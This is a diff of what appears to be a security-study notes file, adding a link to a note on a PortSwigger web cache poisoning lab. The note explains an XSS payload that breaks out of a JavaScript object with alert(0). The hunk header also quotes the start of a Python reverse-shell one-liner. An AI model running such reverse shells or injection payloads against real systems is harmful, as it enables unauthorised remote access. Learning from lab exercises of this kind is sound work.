@@ -954,7 +954,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="unique_javascript_behaviour" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1657475731.84" ts_lastsave="1657483366.37" unique_id="76">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="unique_javascript_behaviour" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1657475731.84" ts_lastsave="1657483489.2" unique_id="76">
 			<rich_text>I just started working on portswigger's web cache poisoning, there is an XSS in which we inject a javascript object where the result of the injection looks like this:
 
 ```data = { &quot;a&quot; : &quot;b&quot;, &quot;c&quot; : &quot;c&quot;-alert(0)-&quot;c&quot;}```
@@ -965,6 +965,10 @@ anybody can help?
 
 </rich_text>
 			<rich_text foreground="#e7e9ea">JavaScript will allow you to use any object with a mathematical operator. In this case both strings will be used with the - operator and alert will be called and the result of calling alert will be undefined and that will also be used as part of the expression.</rich_text>
+			<rich_text>
+
+</rich_text>
+			<rich_text link="webs https://twitter.com/garethheyes/status/1546212977917018114">https://twitter.com/garethheyes/status/1546212977917018114</rich_text>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1656818398.09" unique_id="51">
